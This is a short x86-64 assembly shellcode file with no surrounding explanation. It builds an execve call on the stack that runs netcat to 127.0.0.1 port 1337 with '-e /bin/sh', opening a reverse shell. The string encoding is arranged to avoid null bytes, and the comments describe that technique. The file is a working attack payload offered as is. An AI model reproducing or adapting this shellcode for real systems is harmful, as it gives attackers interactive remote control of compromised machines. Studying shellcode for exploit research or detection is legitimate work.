global _start


section .text

_start:

;syscall: execve("/bin/nc",{"/bin/nc","ip","1337","-e","/bin/sh"},NULL)

mov rdi,0x636e2f6e69622fff
shr	rdi,0x08
push rdi
mov rdi,rsp

mov	rcx,0x68732f6e69622fff
shr	rcx,0x08
push rcx
mov	rcx,rsp

mov rbx,0x652dffffffffffff
shr	rbx,0x30
push rbx
mov	rbx,rsp

mov	r10,0x37333331ffffffff
shr r10,0x20
push r10
mov	r10,rsp

mov r14, 0x302e302e373231ff ;Stack insertion
shr r14,0x08				;Instead fo JMP-Call-Pop pattern
mov word [rsp-2], 0x312e   
sub rsp,2
push r14
mov r14,rsp

mov rdx,r14   ; equivalent to Xor rdx
sub rdx,r14
push	rdx  ;push NULL
push 	rcx  ;push address of 'bin/sh'
push	rbx  ;push address of '-e'
push	r10  ;push address of '1337'
push 	r14  ; modified (push IP value)
push 	rdi  ;push address of '/bin/nc'
mov    	rsi,rsp
mov    	al,59
syscall
